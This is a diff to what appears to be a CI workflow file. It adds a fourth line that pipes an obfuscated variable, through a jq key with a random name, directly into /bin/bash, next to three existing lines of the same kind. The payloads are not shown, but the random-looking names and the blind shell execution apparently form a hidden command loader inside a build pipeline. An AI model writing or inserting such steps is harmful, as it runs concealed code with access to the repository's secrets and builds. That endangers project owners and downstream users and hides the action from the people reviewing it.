@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$l5" | jq -r .pf07167 | /bin/bash
           echo $hbpdf342 | jq -r .ib958 | /bin/bash
           echo $xxkl704 | jq -r .mrpg25634 | /bin/bash
+          printf '%s' "$mziyp4" | jq -r .utyb0 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
